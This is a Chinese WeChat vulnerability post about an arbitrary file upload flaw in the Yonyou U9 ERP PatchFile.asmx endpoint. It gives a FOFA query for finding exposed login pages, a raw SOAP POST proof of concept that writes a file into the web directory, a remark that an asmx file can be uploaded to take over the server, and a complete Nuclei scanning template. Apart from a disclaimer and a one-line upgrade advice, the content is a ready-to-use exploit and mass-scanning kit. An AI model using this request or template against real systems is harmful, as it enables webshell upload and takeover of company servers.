#  用友U9 PatchFile.asmx 任意文件上传漏洞

原创 WLF  [ 伟大航路D ](javascript:void\(0\);)

**伟大航路D** ![]()

微信号 gh_c1fdc31f79ef

功能介绍 日常漏洞分享

____

___发表于_

免责声明：文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

![]()

**![]()**Ⅰ、漏洞描述

U9
cloud聚焦中型和中大型制造企业，全面支持业财税档一体化、设计制造一体化、计划执行一体化、营销服务一体化、项目制造一体化等数智制造场景，赋能组织变革和商业创新，融合产业互联网资源实现连接、共享、协同，助力制造企业高质量发展。

用友U9PathchFile.asmx接口处存在文件上传漏洞，恶意攻击者可能会上传shell文件获取服务器权限，造成安全隐患。

![]()

 **![]()**Ⅱ、fofa语句

  * 

    
    
     title=="        U9-登录    "

  

 **![]()**Ⅲ、漏洞复现  

1、访问，出现以下页面则可能存在此漏洞

  * 

    
    
    http://127.0.0.1/CS/Office/AutoUpdates/PatchFile.asmx?op=SaveFile

  

![]()

POC

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1Host:127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36Connection: closeContent-Type: text/xml; charset=utf-8 <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">  <soap:Body>    <SaveFile xmlns="http://tempuri.org/">      <binData>MTIzNDU2</binData>      <path>./</path>      <fileName>1.txt</fileName>    </SaveFile>  </soap:Body></soap:Envelope>

 **2、构建 POC**

![]()

 **3、访问**  

  * 

    
    
     http://127.0.0.1/CS/Office/AutoUpdates/1.txt

![]()

 **4、也可上传asmx文件获取服务器权限**

 **![]()**Ⅳ、Nuclei-POC  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     id: yonyou-U9-PatchFile-asmx-uploadfile  
    info:  name: 用友U9PathchFile.asmx接口处存在文件上传漏洞 恶意攻击者可能会上传shell文件获取服务器权限 造成安全隐患  author: WLF  severity: high  metadata:     fofa-query: title=="        U9-登录    "variables:  filename: "{{to_lower(rand_base(10))}}"  boundary: "{{to_lower(rand_base(20))}}"http:  - raw:      - |        POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1        Host:{{Hostname}}        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36        Connection: close        Content-Type: text/xml; charset=utf-8                <?xml version="1.0" encoding="utf-8"?>        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">          <soap:Body>            <SaveFile xmlns="http://tempuri.org/">              <binData>MTIzNDU2</binData>              <path>./</path>              <fileName>{{filename}}.txt</fileName>            </SaveFile>          </soap:Body>        </soap:Envelope>          
          - |        GET /CS/Office/AutoUpdates/{{filename}}.txt HTTP/1.1        Host: {{Hostname}}        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0  
        matchers:      - type: dsl        dsl:          - status_code==200 && contains_all(body,"123456")

![]()

 **![]()**Ⅴ、修复建议

  

升级至安全版本  

  

 **  
**

 **  
**

  

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 用友U9 PatchFile.asmx 任意文件上传漏洞

原创 WLF  [ 伟大航路D ](javascript:void\(0\);)

轻触阅读原文

![]()

伟大航路D

赞 分享 在看

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

